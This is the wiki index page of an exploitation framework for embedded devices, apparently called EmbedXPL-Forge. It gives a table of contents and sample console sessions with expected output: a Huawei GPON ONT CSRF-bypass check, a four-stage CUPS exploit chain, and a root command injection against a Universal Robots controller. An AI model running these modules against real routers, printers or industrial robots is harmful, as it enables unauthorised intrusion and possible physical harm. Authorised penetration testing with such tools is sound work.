# EmbedXPL-Forge Wiki (en-US)

**Language:** English (en-US). **Português (pt-BR):** [../pt-BR/README.md](../pt-BR/README.md)


Official usage documentation for the framework. Read on GitHub or copy into the **GitHub Wiki** (separate Git repository).

## Architecture Diagrams (device classes)

PNG gallery. Mermaid sources: [../../diagrams/architecture/README.md](../../diagrams/architecture/README.md).

| SOHO Router | Managed Switch |
|:-----------:|:--------------:|
| ![SOHO](../../img/architecture/exf_arch_router_soho.png) | ![Switch](../../img/architecture/exf_arch_switch_l2l3.png) |

| ISP CPE / GPON ONT | Mixed Edge |
|:------------------:|:----------:|
| ![ISP CPE](../../img/architecture/exf_arch_isp_cpe.png) | ![Mixed edge](../../img/architecture/exf_arch_edge_mixed.png) |

| GPON ONT Full Attack Map |
|:------------------------:|
| ![GPON ONT attack map](../../img/architecture/exf_arch_gpon_ont_attack.png) |

## Table of Contents

| Doc | Topics |
|-----|--------|
| [01-introduction-and-installation.md](01-introduction-and-installation.md) | Introduction, scope, Python, install, diagnostics, logs |
| [02-interactive-shell-commands.md](02-interactive-shell-commands.md) | Interactive commands, discover, sessions |
| [03-search-and-listing.md](03-search-and-listing.md) | `search`, `show`, listing modules and devices |
| [04-non-interactive-mode.md](04-non-interactive-mode.md) | `exf.py -m` / `-s`, automation |
| [05-creds-modules.md](05-creds-modules.md) | Credential modules and options |
| [06-exploits-modules.md](06-exploits-modules.md) | Exploit modules, `check`, layout |
| [07-scanners-and-autopwn.md](07-scanners-and-autopwn.md) | Scanners and AutoPwn |
| [08-generic-modules.md](08-generic-modules.md) | Generic cross-vendor modules (UPnP IGD, SSDP, SNMP, etc.) |
| [09-payloads-and-encoders.md](09-payloads-and-encoders.md) | Payloads and encoders |
| [10-catalogs-and-tools.md](10-catalogs-and-tools.md) | JSON catalogs and `tools/` scripts |
| [11-troubleshooting.md](11-troubleshooting.md) | Common failures and fixes |
| [Module path index (all locales)](../ANEXO-INDICE-MODULOS.md) | Full module path list |

## End-to-End Examples (input and expected output)

### Router exploit (Huawei GPON ONT)

```text
exf > use exploits/routers/huawei/eg8145x6_info_disclosure
exf (EG8145X6 Info Disclosure) > set target 192.168.18.1
exf (EG8145X6 Info Disclosure) > check
exf (EG8145X6 Info Disclosure) > run
```

Expected output:

```text
[+] Target is a Huawei GPON ONT - extracting metadata
[+] ProductName: EG8145X6-10
[+] APPVersion: 1.1.1.1
[+] BuildTimestamp: 202410241935450553184798
[*] CSRF token (static): 9b41cc4ca5587e32228a6a593a18806d...
[+] getRandString STATIC? YES - CSRF BYPASS POSSIBLE
```

### Printer exploit (CUPS Pwn2Own 2026)

```text
exf > use exploits/printers/linux/cups_pwn2own_chain_cve_2026_34480
exf (CUPS Pwn2Own Chain) > set target 192.168.1.10
exf (CUPS Pwn2Own Chain) > set delay 2
exf (CUPS Pwn2Own Chain) > run
```

Expected output:

```text
[*] ============================================================
[*] CUPS Pwn2Own 2026 - Full Chain (CVE-2026-34480)
[*] ============================================================
[+] CUPS IPP is reachable on 192.168.1.10:631
[*] [Stage 1/4] Loading CVE-2026-34477 (cups-browsed UAF)
[+] Stage 1 complete: cups-browsed crash/UAF detected
[*] [Stage 2/4] Loading CVE-2026-34478 (heap spray)
[+] Stage 2 complete: 32/32 spray requests accepted
[*] [Stage 3/4] Loading CVE-2026-34479 (ROP chain LPE)
[+] Stage 3 complete: ROP chain delivered
[*] [Stage 4/4] Chain execution complete
[+] CUPS process no longer responding - chain likely executed
```

### ICS exploit (Universal Robots)

```text
exf > use exploits/ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153
exf (UR PolyScope5) > set target 10.0.1.5
exf (UR PolyScope5) > set cmd "id"
exf (UR PolyScope5) > run
```

Expected output:

```text
[*] Connecting to PolyScope Dashboard on 10.0.1.5:29999
[+] PolyScope Dashboard Server detected
[*] Attempting OS command injection (CVE-2026-8153)
[+] Command injection confirmed!
[+] Output: uid=0(root) gid=0(root) groups=0(root)
```

### Automation mode

```bash
python -m embedxpl -m exploits/routers/huawei/eg8145x6_info_disclosure -s target 192.168.18.1 -s port 80
```

Expected output:

```text
[*] Running module: exploits/routers/huawei/eg8145x6_info_disclosure
[+] ProductName: EG8145X6-10
[+] APPVersion: 1.1.1.1
```

## See also

- [README.md](../../../README.md)
- [CONTRIBUTING.md](../../../CONTRIBUTING.md)
- [docs/COVERAGE_MATRIX.md](../../COVERAGE_MATRIX.md)
